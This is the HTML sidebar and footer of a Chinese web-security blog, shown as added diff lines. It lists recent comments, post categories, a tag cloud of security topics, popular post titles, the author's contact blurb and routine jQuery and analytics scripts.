+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/sqlite3_exec.html">sqlite3_exec</a>
+        
+        <a rel="tag" href="../tag/%E5%AF%92%E5%81%87.html">寒假</a>
+        
+        <a rel="tag" href="../tag/2019.html">2019</a>
+        
+        <a rel="tag" href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
+        
+        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E8%A1%8C.html">命令行</a>
+        
+        <a rel="tag" href="../tag/php.html">php</a>
+        
+        <a rel="tag" href="../tag/CRLF.html">CRLF</a>
+        
+        <a rel="tag" href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">反序列化漏洞</a>
+        
+        <a rel="tag" href="../tag/VS2010.html">VS2010</a>
+        
+        <a rel="tag" href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
+        
+        <a rel="tag" href="../tag/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84.html">内存映射</a>
+        
+        <a rel="tag" href="../tag/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html">原型链污染</a>
+        
+        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
+        
+        <a rel="tag" href="../tag/%E9%98%BB%E6%AD%A2%E8%84%9A%E6%9C%AC%E8%BF%90%E8%A1%8C.html">阻止脚本运行</a>
+        
+        <a rel="tag" href="../tag/%E7%AD%94%E6%A1%88.html">答案</a>
+        
+        <a rel="tag" href="../tag/django.html">django</a>
+        
+        <a rel="tag" href="../tag/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0.html">断点续传</a>
+        
+        <a rel="tag" href="../tag/%E9%93%BE%E8%A1%A8.html">链表</a>
+        
+        <a rel="tag" href="../tag/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html">信息泄露</a>
+        
+        <a rel="tag" href="../tag/getshell.html">getshell</a>
+        
+        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">命令执行漏洞</a>
+        
+        <a rel="tag" href="../tag/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html">反向代理</a>
+        
+        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
+        
+        <a rel="tag" href="../tag/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8.html">前端安全</a>
+        
+        <a rel="tag" href="../tag/scrapy.html">scrapy</a>
+        
+        <a rel="tag" href="../tag/API%E5%87%BD%E6%95%B0.html">API函数</a>
+        
+        <a rel="tag" href="../tag/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.html">条件竞争</a>
+        
+        <a rel="tag" href="../tag/webshell.html">webshell</a>
+        
+        <a rel="tag" href="../tag/%E8%84%B1%E8%A3%A4.html">脱裤</a>
+        
+        <a rel="tag" href="../tag/SQL.html">SQL</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
